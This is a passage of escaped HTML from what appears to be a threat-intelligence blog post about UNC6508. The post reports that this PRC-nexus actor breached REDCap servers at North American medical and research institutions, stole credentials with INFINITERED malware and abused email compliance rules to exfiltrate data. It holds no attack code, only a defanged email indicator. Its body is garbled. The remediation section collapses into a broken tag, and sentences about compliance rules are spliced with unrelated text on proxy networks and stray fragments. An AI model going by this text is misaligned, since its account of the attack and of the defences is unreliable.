McGuiness\u003c/p\u003e\n\u003chr\u003e"]]],[null,null,[null,[null,"\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eGoogle Threat Intelligence Group (GTIG) has identified a sophisticated campaign attributed to UNC6508, a People's Republic of China (PRC)-nexus threat actor, targeting institutions in the North American academic, medical, and military research community. While remaining undetected for over a year, the threat actor compromised externally facing web applications, deployed bespoke malware, pivoted to sensitive internal systems, and abused enterprise administrative tools for covert data exfiltration. The threat actor had broad collection aspirations, including sensitive defense intelligence related to national security, Indo-Pacific command operations, artificial intelligence, uncrewed vehicle systems, cyber offensive programs, and medical research. \u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eGTIG disrupted the malicious infrastructure associated with this threat actor. Working with Mandiant Consulting, we notified the affected organizations upon detection and offered our assistance with remediation. We have updated \u003c/span\u003e\u003ca href\u003d\"https://cloud.google.com/security/products/security-operations\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003eGoogle Security Operations\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e (SecOps) with relevant intelligence, enabling defenders to identify indicators of compromise (IOCs) within their networks. We encourage all users and customers to follow recommended best practices for \u003c/span\u003e\u003ca href\u003d\"https://knowledge.workspace.google.com/admin/apps/best-practices-for-third-party-idp-and-google-workspace-configuration\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003ethird-party Identity Providers\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e (IdP) and ensure \u003c/span\u003e\u003ca href\u003d\"https://knowledge.workspace.google.com/admin/security/about-2sv-enforcement-for-admins\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003e2-Step Verification\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e (2SV) is enabled across all accounts.\u003c/span\u003e\u003c/p\u003e\n\u003ch3\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eCampaign Overview\u003c/span\u003e\u003c/h3\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eThe campaign targeted a diverse set of national, state, and private medical entities. These organizations comprise world-renowned clinical providers, premier academic centers, North American military health institutions, professional advocacy groups, and health regulatory bodies. Their research areas span a broad spectrum of modern medicine, from molecular discovery and clinical drug trials to state-level public health policy and military readiness. They employ thousands of people with a combined research budget in the billions of dollars.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eThe earliest known compromise occurred in September 2023, after which GTIG observed a consistent operational pattern. The threat actor exploited externally facing \u003c/span\u003e\u003ca href\u003d\"http://project-redcap.org\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003eREDCap\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e (Research Electronic Data Capture) servers and deployed custom malware named INFINITERED to capture legitimate REDCap login credentials. Then, after remaining undetected for more than a year, UNC6508 used the captured credentials to access the victim’s internal network. The threat actor was also observed using the novel technique of manipulating domain content compliance rules for data exfiltration. Lastly, UNC6508 used sophisticated operations security (OpSec) techniques to conceal and obfuscate their activity. \u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eGTIG collaborated closely with Mandiant Consulting, the FLARE team, and Workspace Security on this effort to combine our threat intelligence, incident response, and reverse engineering expertise across Google Cloud. This enabled us to develop a complete picture of the \u003c/span\u003e\u003ca href\u003d\"https://cloud.google.com/security/resources/insights/targeted-attack-lifecycle\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003eattack lifecycle\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e from initial compromise to complete mission. \u003c/span\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eGTIG also extends thanks to the affected organizations for their cooperation and the valuable post-exploitation insights they shared.\u003c/span\u003e\u003c/p\u003e\n\u003ch3\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003ePrevention, Detection, and Remediation\u003c/span\u003e\u003c/h3\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eGTIG recommends defenders implement the following security measures, across all Cloud enterprise platforms, to mitigate this threat:\u003c/span\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cstrong REDCap is a web-based software platform designed specifically for building and managing online databases and surveys, in compliance with regulations for medical and scientific research. Administrators can create these rules to manage email messages that contain content matching predefined sets of words, phrases, text patterns, or numerical patterns. By default, compliance rules apply to all users in an organizational unit. The use of compliance rules for data exfiltration is a novel technique not previously observed with PRC-nexus threat actors.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eSpecifically, UNC6508 created a compliance rule named \"\u003c/span\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003ePatroit\u003c/span\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e\" [sic] that used regular expressions to match on keyword and email address patterns in sent or received emails. This strategy, now frequently employed by PRC-nexus actors, involves routing traffic from offensive operations through a mix of compromised routers, residential proxies, Virtual Private Servers (VPS), and other devices.  \u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eThis operation used exclusively US-based OBF network IP addresses to access both the \"\u003c/span\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eBebitaBarefoot774[@]gmail[.]com\u003c/span\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e\" account and when replaying legitimate credentials to access the compromised enterprise administrator account. requirements.\u003c/span\u003e\u003c/p\u003e\n\u003ch3\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eIndicators of Compromise
